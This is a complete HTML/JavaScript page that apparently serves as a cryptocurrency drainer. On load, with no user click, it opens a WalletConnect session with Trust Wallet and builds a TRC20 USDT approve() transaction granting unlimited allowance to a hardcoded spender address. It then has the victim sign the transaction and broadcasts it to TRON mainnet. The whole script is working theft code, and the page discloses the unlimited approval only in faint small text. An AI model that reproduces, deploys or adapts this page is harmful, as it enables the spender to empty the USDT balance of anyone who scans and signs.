<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRON USDT Approve</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:'Segoe UI',sans-serif;
      background:#0a0a0a;color:#e0e0e0;
      display:flex;flex-direction:column;
      align-items:center;justify-content:center;
      min-height:100vh;padding:20px;
    }
    h1{color:#26A17B;font-size:1.5rem;margin-bottom:6px}
    .sub{color:#555;font-size:.83rem;margin-bottom:26px;text-align:center}
    .card{
      background:#111;border:1px solid #1e1e1e;
      border-radius:14px;padding:24px;
      width:100%;max-width:500px;
    }
    .step{
      display:flex;gap:12px;align-items:flex-start;
      padding:12px;border-radius:8px;
      background:#0d0d0d;border-left:3px solid #222;
      margin-bottom:10px;transition:border-color .3s;
    }
    .step.active{border-left-color:#f0a500}
    .step.done  {border-left-color:#22c55e}
    .step.error {border-left-color:#ef4444}
    .step-icon{font-size:1.1rem;min-width:22px}
    .step-title{font-weight:600;font-size:.9rem}
    .step-detail{font-size:.72rem;color:#555;margin-top:3px;word-break:break-all}
    #qr-area{
      display:none;flex-direction:column;
      align-items:center;margin-top:18px;gap:10px;
    }
    #qr-area p{color:#aaa;font-size:.82rem}
    #qr-canvas{background:#fff;padding:8px;border-radius:8px}
    #wc-uri{
      font-size:.62rem;color:#333;
      word-break:break-all;text-align:center;max-width:460px;
    }
    #deeplink-btn{
      display:none;
      background:#3375BB;color:#fff;
      border:none;border-radius:10px;
      padding:13px;font-size:1rem;
      cursor:pointer;width:100%;margin-top:14px;
      font-weight:600;
    }
    #deeplink-btn:hover{background:#2860a0}
    .result{
      display:none;margin-top:16px;
      background:#0d1f0d;border:1px solid #22c55e33;
      border-radius:8px;padding:14px;
      font-size:.72rem;color:#86efac;word-break:break-all;
      white-space:pre-wrap;
    }
    .errbox{
      display:none;margin-top:16px;
      background:#1f0d0d;border:1px solid #ef444433;
      border-radius:8px;padding:14px;
      font-size:.72rem;color:#fca5a5;word-break:break-all;
    }
    #retry{
      display:none;margin-top:12px;
      background:#ef4444;color:#fff;border:none;
      border-radius:8px;padding:10px 22px;
      cursor:pointer;font-size:.88rem;
    }
    #retry:hover{background:#c0392b}
    #loading-overlay{
      position:fixed;inset:0;
      background:#0a0a0aee;
      display:flex;flex-direction:column;
      align-items:center;justify-content:center;
      z-index:999;gap:14px;
    }
    .spinner{
      width:40px;height:40px;
      border:3px solid #222;
      border-top-color:#26A17B;
      border-radius:50%;
      animation:spin .8s linear infinite;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    #loading-overlay p{color:#555;font-size:.85rem}
  </style>
</head>
<body>

<!-- Loading screen while esm.sh resolves deps -->
<div id="loading-overlay">
  <div class="spinner"></div>
  <p>Loading WalletConnect SDK…</p>
</div>

<h1>🔐 USDT Approve · TRC20</h1>
<p class="sub">Unlimited approval<br>Spender: TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>

<div class="card">
  <div class="step" id="s1">
    <span class="step-icon">🔧</span>
    <div><div class="step-title">Initialize WalletConnect v2</div>
    <div class="step-detail" id="d1">Starting…</div></div>
  </div>
  <div class="step" id="s2">
    <span class="step-icon">🔗</span>
    <div><div class="step-title">Generate Pairing URI</div>
    <div class="step-detail" id="d2">Waiting…</div></div>
  </div>
  <div class="step" id="s3">
    <span class="step-icon">📱</span>
    <div><div class="step-title">Wallet Connects</div>
    <div class="step-detail" id="d3">Waiting…</div></div>
  </div>
  <div class="step" id="s4">
    <span class="step-icon">📤</span>
    <div><div class="step-title">Send Approve Transaction</div>
    <div class="step-detail" id="d4">Waiting…</div></div>
  </div>

  <div id="qr-area">
    <p>📷 Scan with Trust Wallet</p>
    <canvas id="qr-canvas" width="220" height="220"></canvas>
    <div id="wc-uri"></div>
  </div>

  <button id="deeplink-btn">📲 Open in Trust Wallet</button>

  <div class="result" id="result"></div>
  <div class="errbox" id="errbox"></div>
  <button id="retry" onclick="location.reload()">🔄 Retry</button>
</div>

<!-- QR renderer -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">

// ══════════════════════════════════════════════════════════
//  ① YOUR PROJECT ID — paste from cloud.walletconnect.com
// ══════════════════════════════════════════════════════════
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";

// ══════════════════════════════════════════════════════════
//  FIXED CONSTANTS
// ══════════════════════════════════════════════════════════
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_HEX     = "43e8107ced383c9e6ca42b2c88ecce7a0b9c1bac"; // TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
const TRON_CHAIN      = "tron:0x2b6653dc";

// approve(address,uint256) with uint256.max
const APPROVE_DATA =
  "095ea7b3" +
  "00000000000000000000000043e8107ced383c9e6ca42b2c88ecce7a0b9c1bac" +
  "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// ══════════════════════════════════════════════════════════
//  BASE58 → HEX  (TRON address conversion, no libs needed)
// ══════════════════════════════════════════════════════════
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function tronToHex(addr) {
  let n = 0n;
  for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
  let h = n.toString(16).padStart(50, "0");
  return h.slice(0, 42); // 21 bytes hex, drop 4-byte checksum
}

// ══════════════════════════════════════════════════════════
//  LIVE TX BUILDER — fetches real block ref from TronGrid
// ══════════════════════════════════════════════════════════
async function buildTx(ownerHex) {
  const res   = await fetch("https://api.trongrid.io/wallet/getnowblock");
  const block = await res.json();

  const blockNum       = block.block_header.raw_data.number;
  const ref_block_bytes = blockNum.toString(16).padStart(4,"0").slice(-4);
  const ref_block_hash  = block.blockID.slice(16, 32);
  const now             = Date.now();

  return {
    visible: false,
    txID: "",
    raw_data: {
      contract: [{
        parameter: {
          value: {
            data:             APPROVE_DATA,
            owner_address:    ownerHex,
            contract_address: tronToHex(USDT_CONTRACT)
          },
          type_url: "type.googleapis.com/protocol.TriggerSmartContract"
        },
        type: "TriggerSmartContract"
      }],
      ref_block_bytes,
      ref_block_hash,
      expiration: now + 3_600_000,  // 1 hour
      fee_limit:  100_000_000,       // 100 TRX
      timestamp:  now
    },
    raw_data_hex: ""
  };
}

// ══════════════════════════════════════════════════════════
//  UI HELPERS
// ══════════════════════════════════════════════════════════
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

function setStep(id, state, detail) {
  document.getElementById(id).className = `step ${state}`;
  if (detail !== undefined)
    document.getElementById(id.replace("s","d")).textContent = detail;
}

function showErr(msg) {
  ["s1","s2","s3","s4"].forEach(id => {
    if (document.getElementById(id).classList.contains("active"))
      setStep(id, "error", msg);
  });
  const b = document.getElementById("errbox");
  b.style.display = "block";
  b.textContent   = "❌ " + msg;
  document.getElementById("retry").style.display = "inline-block";
}

function showResult(data, txid) {
  const b = document.getElementById("result");
  b.style.display = "block";
  b.innerHTML =
    `✅ <strong>Approve signed & broadcast!</strong>\n\n` +
    (txid ? `TxID: ${txid}\n\n` : "") +
    `Signature data:\n${JSON.stringify(data, null, 2)}`;
}

let qrInst = null;
function renderQR(uri) {
  if (isMobile) {
    const btn = document.getElementById("deeplink-btn");
    btn.style.display = "block";
    btn.onclick = () => {
      window.location.href =
        `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
    };
  } else {
    document.getElementById("qr-area").style.display = "flex";
    document.getElementById("wc-uri").textContent = uri;
    if (qrInst) qrInst.clear();
    qrInst = new QRCode(document.getElementById("qr-canvas"), {
      text: uri, width: 220, height: 220,
      colorDark: "#000000", colorLight: "#ffffff",
      correctLevel: QRCode.CorrectLevel.M
    });
  }
}

function hideQR() {
  document.getElementById("qr-area").style.display      = "none";
  document.getElementById("deeplink-btn").style.display = "none";
}

// ══════════════════════════════════════════════════════════
//  MAIN
// ══════════════════════════════════════════════════════════
async function main() {
  try {

    // ── Load SDK via esm.sh (works in plain HTML, no bundler)
    //    esm.sh resolves all Node deps and serves a real browser bundle
    const { SignClient } = await import(
      "https://esm.sh/@walletconnect/sign-client@2.17.0"
    );

    document.getElementById("loading-overlay").style.display = "none";

    // ── 1. Init
    setStep("s1", "active", "Initializing…");
    const client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name:        "USDT Approve",
        description: "TRON USDT unlimited approval",
        url:         window.location.origin,
        icons:       ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
      }
    });
    setStep("s1", "done", "SignClient ready ✓");

    // ── 2. Connect — auto on page load, no button
    setStep("s2", "active", "Generating pairing URI…");
    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction"],
          chains:  [TRON_CHAIN],
          events:  []
        }
      }
    });

    if (!uri) throw new Error("Empty URI — verify your Project ID.");
    setStep("s2", "done", "URI ready ✓");
    renderQR(uri); // show QR / deep link immediately

    // ── 3. Wait for wallet scan + approve
    setStep("s3", "active", isMobile
      ? "Tap button → approve in Trust Wallet…"
      : "Scan QR with Trust Wallet…"
    );
    const session = await approval();
    hideQR();

    const accounts   = session.namespaces?.tron?.accounts ?? [];
    const walletAddr = accounts[0]?.split(":")[2];
    if (!walletAddr) throw new Error("No TRON address in session.");
    setStep("s3", "done", `Connected: ${walletAddr}`);

    // ── 4. Build tx with connected wallet as owner, send immediately
    setStep("s4", "active", "Building transaction…");
    const ownerHex = tronToHex(walletAddr);
    const tx       = await buildTx(ownerHex);

    setStep("s4", "active", "Waiting for signature in wallet…");
    const signed = await client.request({
      topic:   session.topic,
      chainId: TRON_CHAIN,
      request: {
        method: "tron_signTransaction",
        params: { transaction: tx }
      }
    });

    // ── 5. Broadcast to TRON mainnet
    setStep("s4", "active", "Broadcasting to TRON network…");
    const bcRes  = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(signed)
    });
    const bcJson = await bcRes.json();

    if (bcJson.result === true) {
      setStep("s4", "done", `Broadcast OK · txID: ${bcJson.txid}`);
      showResult(signed, bcJson.txid);
    } else {
      setStep("s4", "error", `Broadcast failed: ${bcJson.message ?? JSON.stringify(bcJson)}`);
      showResult(signed, null);
    }

  } catch (err) {
    console.error(err);
    document.getElementById("loading-overlay").style.display = "none";
    showErr(err?.message ?? String(err));
  }
}

main();
</script>
</body>
</html>
